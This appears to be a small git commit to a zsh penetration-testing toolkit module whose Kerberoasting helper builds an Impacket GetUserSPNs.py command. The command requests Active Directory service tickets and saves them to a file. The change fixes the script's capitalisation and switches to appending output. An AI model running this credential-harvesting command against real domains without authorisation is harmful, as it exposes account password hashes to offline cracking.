0de9a91ebbc3b8c5708c4df02b45110d6e419371
Twilight4 <electrolight071@proton.me>
2024-05-05 20:04:09 +0200

    update

--- modules/nb-ad-kerb.zsh
+++ modules/nb-ad-kerb.zsh
@@ -52,5 +52,5 @@ nb-ad-kerb-kerberoast() {
     __check-user
     __ask "Enter the IP address of the target domain controller"
     nb-vars-set-rhost
-    print -z "getuserspns.py -request ${__DOMAIN}s/${__USER} -dc-ip ${__RHOST} | tee $(__domadpath)/kerberoast.txt"
+    print -z "GetUserSPNs.py -request ${__DOMAIN}s/${__USER} -dc-ip ${__RHOST} | tee -a $(__domadpath)/kerberoast.txt"
 }
